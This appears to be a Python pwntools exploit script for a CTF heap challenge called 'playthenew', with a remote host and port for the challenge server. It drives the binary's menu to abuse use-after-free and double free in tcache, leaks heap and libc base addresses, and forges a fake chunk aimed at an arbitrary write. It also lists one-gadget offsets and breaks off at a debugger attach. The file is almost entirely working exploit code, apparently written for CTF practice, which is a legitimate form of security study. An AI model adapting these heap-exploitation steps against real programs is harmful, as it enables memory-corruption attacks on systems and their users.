from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./playthenew.dms')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    io = process('./playthenew.dms')
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('183.60.136.226',17381)

s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)

def buy(idx,sz,name='a\n'):
    ru('> ')
    sl('1')
    ru("Input the index:")
    sl(str(idx))
    ru("input the size of basketball:")
    sl(str(sz))#(0x80,0x200]
    ru("Input the dancer name:")
    s(name)
def delete(idx):
    ru('> ')
    sl('2')
    ru("Input the idx of basketball:")
    sl(str(idx))
def show(idx):
    ru('> ')
    sl('3')
    ru("Input the idx of basketball:")
    sl(str(idx))
    ru('Show the dance:')
def edit(idx,name):
    ru('> ')
    sl('4')
    ru("Input the idx of basketball:")
    sl(str(idx))
    ru("The new dance of the basketball:")
    s(name)
def six(sth):
    ru('> ')
    sl('5')
    ru(b'Input the secret place:')
    sl(sth)
def sixsix():
    ru('> ')
    s(str(0x666)+'\n')

buy(0,0xa0-8,"1")
buy(1,0x150-8,"1")
buy(2,0x150-8,"1")#preserve top
#leak heap
delete(0)
edit(0,'0'*16)
delete(0)
show(0)
heap_base=u64(r(6)+b'\x00\x00')-0x10-0x290
edit(0,'0'*16)
#make tcache 0xa0 6
for i in range(4):
    delete(0)
    edit(0,'0'*16)
#make tcache 0x150 full
for i in range(7):
    delete(1)
    edit(1,'0'*16)
#leak libc
delete(1)
show(1)
libc.address=u64(r(6)+b'\x00\x00')-0x1eabe0
buy(3,0xb0-8,"1")  
buy(3,0x150-8,"222") 
c=p64(0)+p64(0xa0)
c+=p64(heap_base+0x3e0) #fakechunk->fd = chunk
c+=p64(0x100000-0x10)   #attacked addr
c=c.ljust(0xb0-8,b'a')
c+=p64(0xa1)
c+=p64(0xdeadbeef) 
c+=p64(heap_base+0x340) #chunk->bk = fakechunk
edit(1,c)
gdb.attach(io)
buy(3,0xa0-8,"1")
io.interactive()